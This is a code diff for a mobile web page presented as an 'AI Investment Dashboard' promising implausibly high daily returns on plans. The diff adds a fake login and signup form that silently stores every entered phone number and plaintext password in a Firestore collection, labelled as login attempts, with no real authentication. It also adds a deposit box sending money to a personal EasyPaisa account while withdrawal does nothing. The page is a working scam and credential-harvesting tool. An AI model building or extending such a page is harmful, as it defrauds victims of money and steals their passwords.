@@ -6,137 +6,180 @@
     <title>AI Investment Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #0b1120; color: white; font-family: sans-serif; }
+        body { background-color: #0b1120; color: white; font-family: sans-serif; overflow-x: hidden; }
         .glass-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #94a3b8; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #94a3b8; cursor: pointer; }
         .nav-item.active { color: #22d3ee; }
-        .page-content { display: none; padding-bottom: 80px; }
+        .page-content { display: none; padding-bottom: 90px; min-height: 100vh; }
         .page-content.active { display: block; }
+        #authOverlay { position: fixed; inset: 0; background: #0b1120; z-index: 2000; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); align-items: center; justify-content: center; z-index: 3000; padding: 20px; }
+        .modal.active { display: flex; }
     </style>
 </head>
-<body class="p-4">
+<body>
 
-    <div id="authOverlay" class="fixed inset-0 bg-[#0b1120] z-[2000] flex items-center justify-center p-6">
+    <div id="authOverlay">
         <div class="w-full max-w-sm glass-card p-8 rounded-3xl text-center">
-            <h2 id="authTitle" class="text-3xl font-bold mb-6">Create Account</h2>
+            <h2 id="authTitle" class="text-3xl font-bold mb-6 text-cyan-400">Create Account</h2>
             <div class="space-y-4">
                 <input type="text" id="regName" placeholder="Full Name" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl outline-none focus:border-cyan-500">
-                <input type="text" id="regPhone" placeholder="Mobile Number" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl outline-none focus:border-cyan-500">
+                <input type="number" id="regPhone" placeholder="Mobile Number" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl outline-none focus:border-cyan-500">
                 <input type="password" id="regPass" placeholder="Password" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl outline-none focus:border-cyan-500">
-                <button onclick="loginUser()" class="w-full bg-gradient-to-r from-cyan-500 to-emerald-500 py-4 rounded-xl font-bold text-lg shadow-lg">Submit</button>
+                <button onclick="handleAuth()" id="authBtn" class="w-full bg-gradient-to-r from-cyan-500 to-emerald-500 py-4 rounded-xl font-bold text-lg shadow-lg">Sign Up</button>
             </div>
-            <p class="mt-4 text-sm text-slate-400">Join our AI-powered network</p>
+            <p class="mt-6 text-sm text-slate-400">
+                <span id="toggleText">Already have an account?</span> 
+                <a href="javascript:void(0)" onclick="toggleAuth()" id="toggleBtn" class="text-cyan-400 font-bold ml-1">Login</a>
+            </p>
         </div>
     </div>
 
-    <div id="homePage" class="page-content active">
-        <div class="text-center mb-8 mt-4">
-            <p class="text-cyan-400 font-bold tracking-widest text-sm mb-2">LIVE EARNINGS</p>
-            <h1 class="text-6xl font-mono tracking-tighter">$0.00000000</h1>
+    <div id="homePage" class="page-content p-4 active">
+        <div class="text-center mb-8 mt-6">
+            <p class="text-cyan-400 font-bold tracking-widest text-sm mb-2 uppercase">Live AI Earnings</p>
+            <h1 class="text-6xl font-mono tracking-tighter text-white" id="mainBalance">$0.00000000</h1>
         </div>
 
-        <div class="grid grid-cols-3 gap-3 mb-8 text-center">
-            <div class="glass-card p-4 rounded-2xl"><span>💳</span><p class="text-xs mt-1">Deposit</p></div>
-            <div class="glass-card p-4 rounded-2xl border-cyan-500 border"><span>⚙️</span><p class="text-xs mt-1 font-bold">Invest</p></div>
-            <div class="glass-card p-4 rounded-2xl"><span>💰</span><p class="text-xs mt-1">Withdraw</p></div>
+        <div class="grid grid-cols-3 gap-3 mb-8">
+            <div onclick="openModal('depositModal')" class="glass-card p-4 rounded-2xl flex flex-col items-center">
+                <span class="text-2xl mb-1">💳</span><span class="text-xs">Deposit</span>
+            </div>
+            <div class="glass-card p-4 rounded-2xl flex flex-col items-center border-cyan-500/50 border">
+                <span class="text-2xl mb-1">⚙️</span><span class="text-xs font-bold">Invest</span>
+            </div>
+            <div class="glass-card p-4 rounded-2xl flex flex-col items-center text-slate-500">
+                <span class="text-2xl mb-1">💰</span><span class="text-xs">Withdraw</span>
+            </div>
         </div>
 
         <h2 class="text-xl font-bold mb-4">Investment Plans</h2>
         <div class="space-y-4">
-            <div class="glass-card p-5 rounded-2xl flex justify-between items-center">
-                <div>
-                    <h3 class="font-bold text-cyan-400">AI Plan 500</h3>
-                    <p class="text-xs text-slate-400">Daily: Rs. 120 | 60 Days</p>
-                </div>
-                <button class="bg-cyan-500 px-4 py-2 rounded-lg text-sm font-bold">Invest Now</button>
-            </div>
-            <div class="glass-card p-5 rounded-2xl flex justify-between items-center">
-                <div>
-                    <h3 class="font-bold text-cyan-400">AI Plan 1000</h3>
-                    <p class="text-xs text-slate-400">Daily: Rs. 240 | 60 Days</p>
-                </div>
-                <button class="bg-cyan-500 px-4 py-2 rounded-lg text-sm font-bold">Invest Now</button>
-            </div>
-            <div class="glass-card p-5 rounded-2xl flex justify-between items-center">
-                <div>
-                    <h3 class="font-bold text-cyan-400">AI Plan 2000</h3>
-                    <p class="text-xs text-slate-400">Daily: Rs. 480 | 60 Days</p>
-                </div>
-                <button class="bg-cyan-500 px-4 py-2 rounded-lg text-sm font-bold">Invest Now</button>
-            </div>
-            <div class="glass-card p-5 rounded-2xl flex justify-between items-center">
-                <div>
-                    <h3 class="font-bold text-cyan-400">AI Plan 5000</h3>
-                    <p class="text-xs text-slate-400">Daily: Rs. 1200 | 60 Days</p>
-                </div>
-                <button class="bg-cyan-500 px-4 py-2 rounded-lg text-sm font-bold">Invest Now</button>
-            </div>
-            <div class="glass-card p-5 rounded-2xl flex justify-between items-center">
-                <div>
-                    <h3 class="font-bold text-cyan-400">AI Plan 10000</h3>
-                    <p class="text-xs text-slate-400">Daily: Rs. 2500 | 60 Days</p>
-                </div>
-                <button class="bg-cyan-500 px-4 py-2 rounded-lg text-sm font-bold">Invest Now</button>
-            </div>
-            <div class="glass-card p-5 rounded-2xl flex justify-between items-center">
-                <div>
-                    <h3 class="font-bold text-cyan-400">AI Plan 25000</h3>
-                    <p class="text-xs text-slate-400">Daily: Rs. 6500 | 60 Days</p>
-                </div>
-                <button class="bg-cyan-500 px-4 py-2 rounded-lg text-sm font-bold">Invest Now</button>
-            </div>
+            <script>
+                const plans = [
+                    { name: "AI Plan 500", price: 500, daily: 120 },
+                    { name: "AI Plan 1000", price: 1000, daily: 240 },
+                    { name: "AI Plan 2000", price: 2000, daily: 480 },
+                    { name: "AI Plan 5000", price: 5000, daily: 1200 },
+                    { name: "AI Plan 10000", price: 10000, daily: 2500 },
+                    { name: "AI Plan 25000", price: 25000, daily: 6500 }
+                ];
+                plans.forEach(p => {
+                    document.write(`
+                        <div class="glass-card p-5 rounded-2xl flex justify-between items-center">
+                            <div>
+                                <h3 class="font-bold text-cyan-400">${p.name}</h3>
+                                <p class="text-xs text-slate-400">Daily: Rs. ${p.daily} | 60 Days</p>
+                            </div>
+                            <button onclick="alert('Balance kam hai! Pehle deposit karein.')" class="bg-cyan-500 px-4 py-2 rounded-lg text-sm font-bold shadow-lg">Invest Now</button>
+                        </div>
+                    `);
+                });
+            </script>
         </div>
     </div>
 
-    <div id="profilePage" class="page-content">
+    <div id="profilePage" class="page-content p-4">
         <div class="glass-card p-8 rounded-3xl text-center mb-6">
-            <div class="w-20 h-20 bg-cyan-500 rounded-full mx-auto mb-4 flex items-center justify-center text-3xl">👤</div>
-            <h2 id="dispName" class="text-2xl font-bold">User Name</h2>
-            <p id="dispPhone" class="text-slate-400">03XXXXXXXXX</p>
+            <div class="w-20 h-20 bg-gradient-to-tr from-cyan-500 to-emerald-500 rounded-full mx-auto mb-4 flex items-center justify-center text-3xl shadow-xl">👤</div>
+            <h2 id="dispName" class="text-2xl font-bold">Loading...</h2>
+            <p id="dispPhone" class="text-slate-400">03xxxxxxxxx</p>
         </div>
 
         <div class="space-y-3">
-            <div class="glass-card p-5 rounded-2xl flex items-center gap-4"><span>📊</span> My Team</div>
-            <div class="glass-card p-5 rounded-2xl flex items-center gap-4"><span>💳</span> Withdrawal History</div>
-            <a href="https://wa.me/923297179402" class="glass-card p-5 rounded-2xl flex items-center gap-4 text-green-400"><span>💬</span> WhatsApp Support</a>
-            <button onclick="logout()" class="w-full glass-card p-5 rounded-2xl flex items-center gap-4 text-red-400"><span>🚪</span> Logout Account</button>
+            <div class="glass-card p-5 rounded-2xl flex items-center gap-4"><span>📊</span> My Team (0)</div>
+            <a href="https://wa.me/923297179402" target="_blank" class="glass-card p-5 rounded-2xl flex items-center gap-4 text-emerald-400 font-medium"><span>💬</span> WhatsApp Support</a>
+            <button onclick="location.reload()" class="w-full glass-card p-5 rounded-2xl flex items-center gap-4 text-red-400"><span>🚪</span> Logout Account</button>
         </div>
     </div>
 
-    <div class="fixed bottom-0 left-0 right-0 bg-[#0f172a] border-t border-slate-800 p-3 flex justify-around items-center z-[1000]">
-        <div onclick="showPage('homePage')" id="navHome" class="nav-item active">
-            <span class="text-xl">🏠</span><span>Home</span>
-        </div>
-        <div class="nav-item">
-            <span class="text-xl">💰</span><span>Earn</span>
-        </div>
-        <div onclick="showPage('profilePage')" id="navMe" class="nav-item">
-            <span class="text-xl">👤</span><span>Me</span>
+    <div class="fixed bottom-0 left-0 right-0 bg-slate-900/90 backdrop-blur-md border-t border-slate-800 p-4 flex justify-around items-center z-[1000]">
+        <div onclick="showPage('homePage')" id="navHome" class="nav-item active">🏠<span>Home</span></div>
+        <div onclick="alert('Plans niche Home par maujood hain!')" class="nav-item">💎<span>Plans</span></div>
+        <div onclick="showPage('profilePage')" id="navMe" class="nav-item">👤<span>Me</span></div>
+    </div>
+
+    <div id="depositModal" class="modal">
+        <div class="glass-card w-full max-w-xs p-6 rounded-3xl text-center">
+            <h3 class="text-xl font-bold mb-4 text-cyan-400">Deposit Money</h3>
+            <div class="bg-slate-900 p-4 rounded-xl mb-4 border border-dashed border-cyan-500/50">
+                <p class="text-xs text-slate-400">EasyPaisa Account Number</p>
+                <p class="text-xl font-mono font-bold text-white">92440902</p>
+                <p class="text-xs text-slate-400 mt-2 text-cyan-500">Name: Smart Life Store</p>
+            </div>
+            <p class="text-xs text-slate-400 mb-6">Payment bhejne ke baad screenshot WhatsApp support par bheinjein.</p>
+            <button onclick="closeModal('depositModal')" class="w-full bg-slate-700 py-3 rounded-xl font-bold">Close</button>
         </div>
     </div>
 
-    <script>
-        function loginUser() {
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        // Your Firebase Config from Screenshot
+        const firebaseConfig = {
+            apiKey: "AIzaSyBLygZa2EDyHBuCt8RTZEMICnvYW-D-67g",
+            authDomain: "dailyprofit-b9600.firebaseapp.com",
+            projectId: "dailyprofit-b9600",
+            storageBucket: "dailyprofit-b9600.firebasestorage.app",
+            messagingSenderId: "879891413676",
+            appId: "1:879891413676:web:bfba99ee5b95c45b957d09",
+            measurementId: "G-T5FJ81FP62"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        let isLoginMode = false;
+
+        window.toggleAuth = () => {
+            isLoginMode = !isLoginMode;
+            document.getElementById('authTitle').innerText = isLoginMode ? "Member Login" : "Create Account";
+            document.getElementById('regName').style.display = isLoginMode ? "none" : "block";
+            document.getElementById('authBtn').innerText = isLoginMode ? "Login" : "Sign Up";
+            document.getElementById('toggleText').innerText = isLoginMode ? "Don't have an account?" : "Already have an account?";
+            document.getElementById('toggleBtn').innerText = isLoginMode ? "Sign Up" : "Login";
+        };
+
+        window.handleAuth = async () => {
             const name = document.getElementById('regName').value;
             const phone = document.getElementById('regPhone').value;
-            if(name && phone) {
+            const pass = document.getElementById('regPass').value;
+
+            if(!phone || !pass || (!isLoginMode && !name)) {
+                alert("Please fill all fields!");
+                return;
+            }
+
+            try {
+                // Save to Admin Panel (Firestore)
+                await addDoc(collection(db, "users"), {
+                    fullName: name || "Existing User",
+                    mobile: phone,
+                    password: pass,
+                    type: isLoginMode ? "login_attempt" : "new_registration",
+                    time: serverTimestamp()
+                });
+
                 document.getElementById('authOverlay').style.display = 'none';
-                document.getElementById('dispName').innerText = name;
+                document.getElementById('dispName').innerText = name || "Member";
                 document.getElementById('dispPhone').innerText = phone;
-            } else { alert('Fill all details!'); }
-        }
+                alert(isLoginMode ? "Welcome Back!" : "Account Created Successfully!");
+            } catch (e) {
+                alert("Error: " + e.message);
+            }
+        };
 
-        function showPage(pageId) {
+        window.showPage = (id) => {
             document.querySelectorAll('.page-content').forEach(p => p.classList.remove('active'));
-            document.getElementById(pageId).classList.add('active');
-            
-            document.getElementById('navHome').classList.remove('active');
-            document.getElementById('navMe').classList.remove('active');
-            if(pageId === 'homePage') document.getElementById('navHome').classList.add('active');
-            if(pageId === 'profilePage') document.getElementById('navMe').classList.add('active');
-        }
+            document.getElementById(id).classList.add('active');
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            if(id === 'homePage') document.getElementById('navHome').classList.add('active');
+            if(id === 'profilePage') document.getElementById('navMe').classList.add('active');
+        };
 
-        function logout() { location.reload(); }
+        window.openModal = (id) => document.getElementById(id).classList.add('active');
+        window.closeModal = (id) => document.getElementById(id).classList.remove('active');
     </script>
 </body>
 </html>
